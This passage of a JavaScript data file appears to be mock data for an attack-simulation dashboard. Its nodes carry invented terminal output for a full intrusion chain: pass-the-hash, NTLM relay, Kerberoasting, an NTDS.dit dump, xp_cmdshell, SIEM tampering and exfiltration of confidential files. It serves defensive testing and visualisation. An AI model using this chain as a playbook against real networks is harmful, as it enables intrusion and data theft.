    { node_id: 's3-a07', node_type: 'ACTION', node_label: 'NetExec SSH Pivot to Proxy-01', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T03:17:00Z', node_agent: 'sentinel_one', node_ip: '10.0.0.2', node_user_privileges: 'proxy → root',
      node_terminal_output: `SSH   10.0.0.2     22     PERI-PROXY-01 [+] proxy:db_user:Prod@123 (from config) — SUCCESS\nSSH   10.0.0.2     22     PERI-PROXY-01 [+] root via sudo NOPASSWD\n[+] /etc/squid/squid.conf read — internal network routes mapped` },
    { node_id: 's3-a08', node_type: 'ACTION', node_label: 'NetExec SMB Proxy-02 Relay', node_status: 'undetected', node_payload_name: 'netexec – SMB relay', node_executed_at: '2025-03-05T03:20:11Z', node_agent: 'openaev', node_ip: '10.0.0.3',
      node_terminal_output: `SMB   10.0.0.3     445    PERI-PROXY-02 [+] NTLM relay from PERI-PROXY-01 — Auth OK\nSMB   10.0.0.3     445    PERI-PROXY-02 [+] Pwn3d! — shell spawned as proxy user\n[+] Pivoting complete — full perimeter foothold achieved` },

    // Phase 2 – Perimeter Breach (2 actions)
    { node_id: 's3-a09', node_type: 'ACTION', node_label: 'HTTP Admin Panel Probe', node_status: 'detected', node_payload_name: 'http-query – GET /admin', node_executed_at: '2025-03-05T03:23:00Z', node_agent: 'palo_alto', node_ip: '10.0.0.1',
      node_terminal_output: `GET https://10.0.0.1/admin HTTP/1.1\n← 200 OK (pfSense admin panel reachable)\n[!] DETECTION: IDS rule FW_ADMIN_ACCESS triggered\n[!] SIEM Alert: Unauthorized admin panel probe from 10.0.0.2` },
    { node_id: 's3-a10', node_type: 'ACTION', node_label: 'HTTP Admin Brute-Force', node_status: 'prevented', node_payload_name: 'http-query – POST /login', node_executed_at: '2025-03-05T03:24:30Z', node_agent: 'openaev', node_ip: '10.0.0.1',
      node_terminal_output: `POST https://10.0.0.1/login admin:pfsense ... 401\nPOST https://10.0.0.1/login admin:admin ... 401\n[!] PREVENTION: pfSense lockout after 2 failed attempts\n[!] IP 10.0.0.2 blocked by pfSense anti-lockout rule` },

    // Phase 3 – Executive Zone Lateral (8 actions)
    { node_id: 's3-a11', node_type: 'ACTION', node_label: 'Nmap Internal Exec Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP Connect Scan', node_executed_at: '2025-03-05T03:28:00Z', node_agent: 'openaev', node_ip: '10.0.5.0/24',
      node_terminal_output: `Nmap scan 10.0.5.0/24 — 8 hosts up\n10.0.5.101 EXEC-WS-01  445,3389 open\n10.0.5.102 EXEC-WS-02  445,3389 open\n10.0.5.103 EXEC-WS-03  445,3389,5985 open\n10.0.5.104 EXEC-WS-04  445 open\n10.0.5.150 EXEC-LAPTOP-01  445,3389 open\nNmap done in 8.4s`,
      node_ports_found:['135/tcp open msrpc', '139/tcp open netbios-ssn', '445/tcp open microsoft-ds', '3389/tcp open ms-wbt-server RDP', '5985/tcp open http WinRM'] },
    { node_id: 's3-a12', node_type: 'ACTION', node_label: 'SMB AV Enumeration (WS-02)', node_status: 'undetected', node_payload_name: 'netexec – SMB enum_av', node_executed_at: '2025-03-05T03:31:10Z', node_agent: 'sentinel_one', node_ip: '10.0.5.102',
      node_terminal_output: `SMB   10.0.5.102  445  EXEC-WS-02  [+] CORP\\cfo.baker:<HASH> (Pwn3d!)\nSMB   10.0.5.102  445  EXEC-WS-02  [*] AV: McAfee ENS — disabled (GPO conflict)\n[+] No active protection — fully accessible` },
    { node_id: 's3-a13', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (WS-01)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T03:34:20Z', node_agent: 'openaev', node_ip: '10.0.5.101', node_accessed_files: ['C:\\Users\\ceo.anderson\\Documents\\Board_Strategy_2025.docx'],
      node_terminal_output: `SMB   10.0.5.101  445  EXEC-WS-01  [+] CORP\\ceo.anderson:<HASH> (Pwn3d!)\n[+] Board_Strategy_2025.docx (1.8 MB) — exfiltrated\n[+] M&A acquisition targets document found` },
    { node_id: 's3-a14', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (WS-02)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T03:36:45Z', node_agent: 'sentinel_one', node_ip: '10.0.5.102', node_accessed_files: ['C:\\Finance\\M&A_Plans_Confidential.xlsx'],
      node_terminal_output: `SMB   10.0.5.102  445  EXEC-WS-02  [+] CORP\\cfo.baker:<HASH> (Pwn3d!)\n[+] M&A_Plans_Confidential.xlsx (3.2 MB) — exfiltrated\n[!] HIGH VALUE: M&A financial projections accessed` },
    { node_id: 's3-a15', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (WS-03)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T03:39:00Z', node_agent: 'palo_alto', node_ip: '10.0.5.103', node_credentials_found: ['CORP\\svc_admin:Admin@Prod!'],
      node_terminal_output: `SMB   10.0.5.103  445  EXEC-WS-03  [+] CORP\\cto.chen:<HASH> (Pwn3d!)\n[+] server_creds.kdbx found — cracked with hashcat\n[+] svc_admin:Admin@Prod! extracted` },
    { node_id: 's3-a16', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (WS-04)', node_status: 'detected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T03:41:30Z', node_agent: 'sentinel_one', node_ip: '10.0.5.104',
      node_terminal_output: `SMB   10.0.5.104  445  EXEC-WS-04  [*] Attempting PtH...\n[!] DETECTION: CrowdStrike EDR detected PtH lateral movement\n[!] Alert: LATERAL_MOVEMENT_PtH from EXEC-WS-03 to EXEC-WS-04\n[-] Session terminated by EDR` },
    { node_id: 's3-a17', node_type: 'ACTION', node_label: 'RDP Login (Exec Laptop)', node_status: 'undetected', node_payload_name: 'netexec – RDP login', node_executed_at: '2025-03-05T03:44:00Z', node_agent: 'openaev', node_ip: '10.0.5.150',
      node_terminal_output: `RDP   10.0.5.150  3389  EXEC-LAPTOP-01  [+] CORP\\vp.sales:Admin@Prod! — SUCCESS\n[+] VPN connected — remote work laptop accessed\n[+] Email client with executive communications found` },
    { node_id: 's3-a18', node_type: 'ACTION', node_label: 'SSH Login (Exec Mac)', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T03:46:20Z', node_agent: 'openaev', node_ip: '10.0.5.160',
      node_terminal_output: `SSH   10.0.5.160  22  EXEC-MAC-01  [+] localadmin:Admin@Prod! — SUCCESS\n[+] macOS keychain unlocked — corporate certs found\n[+] id: uid=0 (sudo ALL)` },

    // Phase 4 – Engineering Zone (5 actions)
    { node_id: 's3-a19', node_type: 'ACTION', node_label: 'SMB Spider+ (Printer)', node_status: 'undetected', node_payload_name: 'netexec – SMB spider_plus', node_executed_at: '2025-03-05T03:50:00Z', node_agent: 'openaev', node_ip: '10.0.5.20', node_credentials_found: ['CORP\\svc_mssql:Sql#2024'],
      node_terminal_output: `SMB   10.0.5.20   445  EXEC-PRINTER-01  [+] CORP\\svc_print:<HASH> (Pwn3d!)\n[+] Printer config XML: svc_mssql:Sql#2024\n[+] Spool drivers directory indexed (47 files)` },
    { node_id: 's3-a20', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (Eng-01)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T03:53:15Z', node_agent: 'openaev', node_ip: '10.0.10.101',
      node_terminal_output: `SMB   10.0.10.101  445  ENG-WS-01  [+] CORP\\eng.dev01:<HASH> (Pwn3d!)\n[+] C:\\dev\\api\\src\\config.json — DB connection strings found\n[+] Azure DevOps PAT token detected in config` },
    { node_id: 's3-a21', node_type: 'ACTION', node_label: 'SSH Build Server Exploit', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T03:56:30Z', node_agent: 'sentinel_one', node_ip: '10.0.10.20', node_accessed_files: ['/var/jenkins_home/config.xml'], node_credentials_found: ['jenkins_admin:Jenkins@2024'],
      node_terminal_output: `SSH   10.0.10.20  22  ENG-BUILD-01  [+] jenkins:Jenkins@2024 — SUCCESS\n[+] Jenkins admin panel: /var/jenkins_home/config.xml parsed\n[+] All pipeline credentials extracted (9 secrets)\n[+] Pipeline injection payload deployed to build #482` },
    { node_id: 's3-a22', node_type: 'ACTION', node_label: 'SSH Deploy Server Pivot', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T03:59:00Z', node_agent: 'palo_alto', node_ip: '10.0.10.21', node_accessed_files: ['/etc/kubernetes/admin.conf'],
      node_terminal_output: `SSH   10.0.10.21  22  ENG-DEPLOY-01  [+] deploy:Jenkins@2024 (reuse) — SUCCESS\n[+] /etc/kubernetes/admin.conf — Kubernetes cluster admin token\n[+] kubectl access: 3 namespaces, 47 pods visible` },
    { node_id: 's3-a23', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (Eng-02)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T04:01:45Z', node_agent: 'palo_alto', node_ip: '10.0.10.102', node_credentials_found: ['gitlab_token:glpat-xxxx'],
      node_terminal_output: `SMB   10.0.10.102  445  ENG-WS-02  [+] CORP\\eng.dev02:<HASH> (Pwn3d!)\n[+] .env file: GITLAB_TOKEN=glpat-xxxxxxxxxxxx\n[+] Source code repos (47) now accessible` },

    // Phase 5 – Finance Zone (4 actions)
    { node_id: 's3-a24', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (Fin-01)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T04:05:00Z', node_agent: 'sentinel_one', node_ip: '10.0.15.101', node_accessed_files: ['C:\\Finance\\Annual_Report_2024.xlsx'],
      node_terminal_output: `SMB   10.0.15.101  445  FIN-WS-01  [+] CORP\\fin.acct01:<HASH> (Pwn3d!)\n[+] Annual_Report_2024.xlsx (2.1 MB) — exfiltrated\n[+] Pre-release financial data accessed` },
    { node_id: 's3-a25', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (Fin-02)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T04:07:20Z', node_agent: 'openaev', node_ip: '10.0.15.102',
      node_terminal_output: `SMB   10.0.15.102  445  FIN-WS-02  [+] CORP\\fin.acct02:<HASH> (Pwn3d!)\n[*] No sensitive files in accessible shares\n[+] Credential cache harvested` },
    { node_id: 's3-a26', node_type: 'ACTION', node_label: 'SMB ERP Server Access', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T04:10:00Z', node_agent: 'openaev', node_ip: '10.0.15.10', node_accessed_files: ['D:\\ERP\\data\\financial_records.mdb'], node_credentials_found: ['erp_sa:Erp@Corp2024'],
      node_terminal_output: `SMB   10.0.15.10  445  FIN-ERP-01  [+] CORP\\svc_erp:Erp@Corp2024 — SUCCESS\n[+] D:\\ERP\\data\\financial_records.mdb (892 MB) — initiated download\n[+] 5 years of financial transaction records exfiltrated` },
    { node_id: 's3-a27', node_type: 'ACTION', node_label: 'MSSQL Reporting Server', node_status: 'detected', node_payload_name: 'netexec – MSSQL exec', node_executed_at: '2025-03-05T04:13:00Z', node_agent: 'sentinel_one', node_ip: '10.0.15.11',
      node_terminal_output: `MSSQL 10.0.15.11  1433  FIN-REPORTING-01  [*] Trying erp_sa:Erp@Corp2024\n[!] DETECTION: SQL audit log — elevated login from unknown IP\n[!] SIEM Alert: DB_SUSPICIOUS_LOGIN\n[-] Account locked after detection` },

    // Phase 6 – Server Farm Breach (5 actions)
    { node_id: 's3-a28', node_type: 'ACTION', node_label: 'SSH Web Server Access', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T04:17:00Z', node_agent: 'palo_alto', node_ip: '10.0.20.11',
      node_terminal_output: `SSH   10.0.20.11  22  SRV-WEB-01  [+] deploy:Jenkins@2024 (reuse) — SUCCESS\n[+] /var/www/app/config/database.yml parsed\n[+] PostgreSQL connection string extracted` },
    { node_id: 's3-a29', node_type: 'ACTION', node_label: 'SSH API-01 Credential Reuse', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T04:20:15Z', node_agent: 'openaev', node_ip: '10.0.20.21', node_credentials_found: ['redis_pass:R3dis@Prod'],
      node_terminal_output: `SSH   10.0.20.21  22  SRV-API-01  [+] appuser:Admin@Prod! — SUCCESS\n[+] /opt/api/config/production.yml: redis_password=R3dis@Prod\n[+] Redis cache accessible — session tokens extractable` },
    { node_id: 's3-a30', node_type: 'ACTION', node_label: 'SSH API-02 Lateral Move', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T04:23:00Z', node_agent: 'palo_alto', node_ip: '10.0.20.22',
      node_terminal_output: `SSH   10.0.20.22  22  SRV-API-02  [+] appuser:Admin@Prod! — SUCCESS\n[+] Cluster API-02 fully compromised\n[+] Internal service mesh credentials found in environment` },
    { node_id: 's3-a31', node_type: 'ACTION', node_label: 'MSSQL SA Login + Exec', node_status: 'undetected', node_payload_name: 'netexec – MSSQL exec', node_executed_at: '2025-03-05T04:26:30Z', node_agent: 'sentinel_one', node_ip: '10.0.21.10', node_credentials_found: ['sa:Admin@123', 'app_db:AppDB@2024'],
      node_terminal_output: `MSSQL 10.0.21.10  1433  DB-MSSQL-01  [+] sa:Admin@123 — SUCCESS\nMSSQL 10.0.21.10  1433  DB-MSSQL-01  [*] xp_cmdshell enabled\nMSSQL 10.0.21.10  1433  DB-MSSQL-01  [+] exec xp_cmdshell 'whoami': nt authority\\system\n[+] ProductionDB.mdf: 14 GB table data accessible` },
    { node_id: 's3-a32', node_type: 'ACTION', node_label: 'Oracle TNS Listener Exploit', node_status: 'undetected', node_payload_name: 'netexec – SSH privesc', node_executed_at: '2025-03-05T04:29:45Z', node_agent: 'sentinel_one', node_ip: '10.0.21.11', node_credentials_found: ['SYS:Change_on_install'],
      node_terminal_output: `[*] Oracle TNS listener on 10.0.21.11:1521\n[+] SYS:Change_on_install (default credential) — SUCCESS\n[+] oracle@DB-ORACLE-01 → uid=0 via SUID oracle binary\n[+] /u01/app/oracle/oradata/ accessible (full DB)` },

    // Phase 7 – Domain Compromise (4 actions)
    { node_id: 's3-a33', node_type: 'ACTION', node_label: 'LDAP Kerberoasting (DC-01)', node_status: 'undetected', node_payload_name: 'netexec – LDAP Kerberoasting', node_executed_at: '2025-03-05T04:34:00Z', node_agent: 'sentinel_one', node_ip: '10.0.30.5', node_credentials_found: ['$krb5tgs$23$*...', 'All 1,247 domain accounts'],
      node_terminal_output: `LDAP  10.0.30.5  389  MGMT-DC-01  [*] Kerberoasting query — 12 accounts found\n[+] TGS tickets: 12 hashes saved\n[+] Offline crack: svc_mssql cracked in 47min (Hashcat -m 13100)\n[+] Service account creds → DA path escalation`,
      node_users_found:['CORP\\Administrator', 'CORP\\krbtgt', 'CORP\\svc_mssql', 'CORP\\svc_deploy', 'CORP\\svc_erp', 'CORP\\svc_backup', 'CORP\\mgmt.admin', 'CORP\\fin.taylor'] },
    { node_id: 's3-a34', node_type: 'ACTION', node_label: 'SMB NTDS.dit Dump (DC-01)', node_status: 'undetected', node_payload_name: 'netexec – SMB secretsdump', node_executed_at: '2025-03-05T04:37:20Z', node_agent: 'sentinel_one', node_ip: '10.0.30.5',
      node_terminal_output: `SMB   10.0.30.5  445  MGMT-DC-01  [+] CORP\\Administrator (Domain Admin) — secretsdump\n[+] NTDS.dit dump: 1,247 accounts extracted via VSS\n[+] krbtgt hash acquired — Golden Ticket possible\n[+] All domain credentials compromised` },
    { node_id: 's3-a35', node_type: 'ACTION', node_label: 'SMB Backup Op (DC-02)', node_status: 'undetected', node_payload_name: 'netexec – SMB backup_operator', node_executed_at: '2025-03-05T04:40:05Z', node_agent: 'palo_alto', node_ip: '10.0.30.6', node_credentials_found: ['CORP\\svc_backup:Backup@2024!'],
      node_terminal_output: `SMB   10.0.30.6  445  MGMT-DC-02  [+] Backup Operator abuse — shadow copy created\n[+] NTDS.dit + SYSTEM hive exfiltrated from DC-02\n[+] svc_backup:Backup@2024! extracted from NTDS` },
    { node_id: 's3-a36', node_type: 'ACTION', node_label: 'LDAP ADCS CA Enum', node_status: 'detected', node_payload_name: 'netexec – LDAP adcs', node_executed_at: '2025-03-05T04:43:10Z', node_agent: 'openaev', node_ip: '10.0.30.10',
      node_terminal_output: `LDAP  10.0.30.10  389  MGMT-CA-01  [*] Enumerating ADCS certificate templates\n[!] DETECTION: LDAP query anomaly detected by MDI\n[!] Alert: ADCS_ENUM from non-admin account — SOC alerted\n[-] CA enumeration detected, further access restricted` },

    // Phase 8 – Management Zone (4 actions)
    { node_id: 's3-a37', node_type: 'ACTION', node_label: 'RDP Jump Host Login', node_status: 'undetected', node_payload_name: 'netexec – RDP login', node_executed_at: '2025-03-05T04:47:00Z', node_agent: 'openaev', node_ip: '10.0.30.20',
      node_terminal_output: `RDP   10.0.30.20  3389  MGMT-JUMP-01  [+] CORP\\Administrator (Golden Ticket) — SUCCESS\n[+] Jump server accessed — multiple active admin sessions found\n[+] Credential harvesting from RDP session manager cache` },
    { node_id: 's3-a38', node_type: 'ACTION', node_label: 'PG Database Dump Attempt', node_status: 'detected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T04:49:30Z', node_agent: 'openaev', node_ip: '10.0.21.12',
      node_terminal_output: `SSH   10.0.21.12  22  DB-PG-01  [*] postgres:Admin@Prod! ... partial access\n[!] DETECTION: PostgreSQL audit log — pg_hba.conf rejected remote SA login\n[!] SIEM Alert: DB_UNAUTHORIZED_ACCESS\n[-] PostgreSQL auth policy blocked access` },
    { node_id: 's3-a39', node_type: 'ACTION', node_label: 'WMI SIEM Tampering', node_status: 'prevented', node_payload_name: 'netexec – WMI command exec', node_executed_at: '2025-03-05T04:52:00Z', node_agent: 'openaev', node_ip: '10.0.30.50',
      node_terminal_output: `WMI   10.0.30.50  135  MGMT-SIEM-01  [*] Attempting WMI to disable SIEM logging\n[!] PREVENTION: WMI access to SIEM host blocked by host firewall\n[!] SIEM self-protection rule: WMI_TO_SIEM_HOST denied\n[-] SIEM tampering PREVENTED — all logs intact` },
    { node_id: 's3-a40', node_type: 'ACTION', node_label: 'SMB Eng-03 Hash Spray', node_status: 'detected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-03-05T03:44:50Z', node_agent: 'sentinel_one', node_ip: '10.0.10.103',
      node_terminal_output: `SMB   10.0.10.103  445  ENG-WS-03  [*] PtH lateral attempt from ENG-WS-02\n[!] DETECTION: CrowdStrike blocked PtH authentication\n[!] Alert: SMB_LATERAL_MOVEMENT — quarantine initiated\n[-] Access denied` },
    // Nmap bulk discovery — covers all endpoints not reached by existing scans
    {
      node_id: 's3-a-nmap-bulk',
      node_type: 'ACTION',
      node_label: 'Nmap Full-Network Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (full network)',
      node_executed_at: '2025-03-05T02:55:00Z',
      node_agent: 'openaev',
      node_ip: '0.0.0.0/0',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org ) at 2025-03-05 02:55 UTC
Nmap scan report for 203.0.113.10 (DMZ-WEB-01)
HOST: up
80/tcp  open  http
443/tcp open  ssl/https
8080/tcp open  http-proxy

Nmap scan report for 203.0.113.11 (DMZ-WEB-02)
HOST: up
80/tcp  open  http
443/tcp open  ssl/https
25/tcp  open  smtp

Nmap scan report for 203.0.113.12 (DMZ-WEB-03)
HOST: up
80/tcp  open  http
443/tcp open  ssl/https

Nmap scan report for 203.0.113.20 (DMZ-MAIL-01)
HOST: up
22/tcp  open  ssh
25/tcp  open  smtp
143/tcp open  imap

Nmap scan report for 203.0.113.30 (DMZ-FTP-01)
HOST: up
21/tcp  open  ftp
22/tcp  open  ssh

Nmap scan report for 10.0.0.1 (PERI-FW-01)
HOST: up
80/tcp  open  http
443/tcp open  https
22/tcp  filtered ssh

Nmap scan report for 10.0.0.2 (PERI-PROXY-01)
HOST: up
22/tcp  open  ssh
3128/tcp open  squid-http

Nmap scan report for 10.0.0.3 (PERI-PROXY-02)
HOST: up
22/tcp  open  ssh
3128/tcp open  squid-http

Nmap scan report for 10.0.5.101 (EXEC-WS-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.0.5.102 (EXEC-WS-02)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.0.5.103 (EXEC-WS-03)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.0.5.104 (EXEC-WS-04)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.5.105 (EXEC-WS-05)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.5.20 (EXEC-PRINTER-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
9100/tcp open  jetdirect

Nmap scan report for 10.0.5.150 (EXEC-LAPTOP-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.0.5.160 (EXEC-MAC-01)
HOST: up
22/tcp  open  ssh
5900/tcp open  vnc

Nmap scan report for 10.0.10.101 (ENG-WS-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.10.102 (ENG-WS-02)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.10.103 (ENG-WS-03)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.10.104 (ENG-WS-04)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.10.105 (ENG-WS-05)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.10.20 (ENG-BUILD-01)
HOST: up
22/tcp  open  ssh
8080/tcp open  jenkins

Nmap scan report for 10.0.10.21 (ENG-DEPLOY-01)
HOST: up
22/tcp  open  ssh
6443/tcp open  kubernetes

Nmap scan report for 10.0.15.101 (FIN-WS-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.15.102 (FIN-WS-02)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.15.103 (FIN-WS-03)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.15.104 (FIN-WS-04)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.15.10 (FIN-ERP-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
1433/tcp open  ms-sql-s

Nmap scan report for 10.0.15.11 (FIN-REPORTING-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
1433/tcp open  ms-sql-s

Nmap scan report for 10.0.20.11 (SRV-WEB-01)
HOST: up
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  ssl/https

Nmap scan report for 10.0.20.12 (SRV-WEB-02)
HOST: up
22/tcp  open  ssh
80/tcp  open  http

Nmap scan report for 10.0.20.13 (SRV-WEB-03)
HOST: up
22/tcp  open  ssh
80/tcp  open  http

Nmap scan report for 10.0.20.21 (SRV-API-01)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.0.20.22 (SRV-API-02)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.0.21.10 (DB-MSSQL-01)
HOST: up
135/tcp open  msrpc
1433/tcp open  ms-sql-s

Nmap scan report for 10.0.21.11 (DB-ORACLE-01)
HOST: up
22/tcp  open  ssh
1521/tcp open  oracle-tns

Nmap scan report for 10.0.21.12 (DB-PG-01)
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 10.0.21.13 (DB-REDIS-01)
HOST: up
6379/tcp open  redis

Nmap scan report for 10.0.21.14 (DB-MONGO-01)
HOST: up
22/tcp  open  ssh
27017/tcp open  mongodb

Nmap scan report for 10.0.30.5 (MGMT-DC-01)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds
636/tcp open  ldapssl

Nmap scan report for 10.0.30.6 (MGMT-DC-02)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 10.0.30.10 (MGMT-CA-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
443/tcp open  ssl/https

Nmap scan report for 10.0.30.20 (MGMT-JUMP-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.0.30.50 (MGMT-SIEM-01)
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch
5601/tcp open  kibana

Nmap scan report for 172.16.0.101 (VPN-REMOTE-01)
HOST: up
22/tcp  open  ssh
3389/tcp filtered ms-wbt-server

Nmap scan report for 172.16.0.102 (VPN-REMOTE-02)
HOST: up
22/tcp  open  ssh
5900/tcp open  vnc

Nmap scan report for 172.16.0.103 (VPN-REMOTE-03)
HOST: up
22/tcp  open  ssh
135/tcp open  msrpc

Nmap scan report for 172.16.0.104 (VPN-REMOTE-04)
HOST: up
22/tcp  open  ssh
9418/tcp open  git

Nmap scan report for 10.0.40.10 (BACKUP-NFS-01)
HOST: up
22/tcp  open  ssh
2049/tcp open  nfs

Nmap scan report for 10.0.40.20 (BACKUP-TAPE-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap done: 254 IP addresses (50 hosts up) scanned in 87.3 seconds`,
    },
  ],

  attack_path_edges: [
    // ── chain_flow (linear attack progression) ───────────────────────────────
    { edge_id: 's3-c01', edge_source: 's3-a01', edge_target: 's3-a02', edge_type: 'chain_flow' },
    { edge_id: 's3-c02', edge_source: 's3-a02', edge_target: 's3-a03', edge_type: 'chain_flow', edge_label: 'pivot' },
    { edge_id: 's3-c03', edge_source: 's3-a03', edge_target: 's3-a04', edge_type: 'chain_flow' },
    { edge_id: 's3-c04', edge_source: 's3-a04', edge_target: 's3-a05', edge_type: 'chain_flow' },
    { edge_id: 's3-c05', edge_source: 's3-a05', edge_target: 's3-a06', edge_type: 'chain_flow' },
    { edge_id: 's3-c06', edge_source: 's3-a06', edge_target: 's3-a07', edge_type: 'chain_flow', edge_label: 'pivot' },
    { edge_id: 's3-c07', edge_source: 's3-a07', edge_target: 's3-a08', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c08', edge_source: 's3-a08', edge_target: 's3-a09', edge_type: 'chain_flow' },
    { edge_id: 's3-c09', edge_source: 's3-a09', edge_target: 's3-a10', edge_type: 'chain_flow' },
    { edge_id: 's3-c10', edge_source: 's3-a10', edge_target: 's3-a11', edge_type: 'chain_flow', edge_label: 'internal recon' },
    { edge_id: 's3-c11', edge_source: 's3-a11', edge_target: 's3-a12', edge_type: 'chain_flow' },
    { edge_id: 's3-c12', edge_source: 's3-a12', edge_target: 's3-a13', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c13', edge_source: 's3-a13', edge_target: 's3-a14', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c14', edge_source: 's3-a14', edge_target: 's3-a15', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c15', edge_source: 's3-a15', edge_target: 's3-a16', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c16', edge_source: 's3-a16', edge_target: 's3-a17', edge_type: 'chain_flow' },
    { edge_id: 's3-c17', edge_source: 's3-a17', edge_target: 's3-a18', edge_type: 'chain_flow' },
    { edge_id: 's3-c18', edge_source: 's3-a18', edge_target: 's3-a19', edge_type: 'chain_flow' },
    { edge_id: 's3-c19', edge_source: 's3-a19', edge_target: 's3-a20', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c20', edge_source: 's3-a20', edge_target: 's3-a21', edge_type: 'chain_flow' },
    { edge_id: 's3-c21', edge_source: 's3-a21', edge_target: 's3-a22', edge_type: 'chain_flow' },
    { edge_id: 's3-c22', edge_source: 's3-a22', edge_target: 's3-a23', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c23', edge_source: 's3-a23', edge_target: 's3-a24', edge_type: 'chain_flow', edge_label: 'finance zone' },
    { edge_id: 's3-c24', edge_source: 's3-a24', edge_target: 's3-a25', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c25', edge_source: 's3-a25', edge_target: 's3-a26', edge_type: 'chain_flow' },
    { edge_id: 's3-c26', edge_source: 's3-a26', edge_target: 's3-a27', edge_type: 'chain_flow' },
    { edge_id: 's3-c27', edge_source: 's3-a27', edge_target: 's3-a28', edge_type: 'chain_flow', edge_label: 'server farm' },
    { edge_id: 's3-c28', edge_source: 's3-a28', edge_target: 's3-a29', edge_type: 'chain_flow' },
    { edge_id: 's3-c29', edge_source: 's3-a29', edge_target: 's3-a30', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's3-c30', edge_source: 's3-a30', edge_target: 's3-a31', edge_type: 'chain_flow', edge_label: 'DB breach' },
    { edge_id: 's3-c31', edge_source: 's3-a31', edge_target: 's3-a32', edge_type: 'chain_flow', edge_label: 'lateral' },
